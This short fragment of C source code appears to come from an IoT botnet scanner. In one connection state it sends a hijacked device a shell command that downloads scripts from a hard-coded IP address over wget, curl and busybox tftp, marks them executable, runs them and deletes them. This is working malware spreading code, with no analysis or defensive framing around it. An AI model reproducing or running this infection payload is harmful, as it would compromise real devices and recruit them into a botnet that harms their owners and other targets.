			...
			case 5:
				{
					...
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; wget http://208.67.1.62/gtop.sh || curl -O http://208.67.1.62/gtop.sh; chmod 777 gtop.sh; sh gtop.sh; busybox tftp 208.67.1.62 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 208.67.1.62; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf gtop.sh tftp1.sh tftp2.sh\r\n", 350, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 6;
				}
				break;
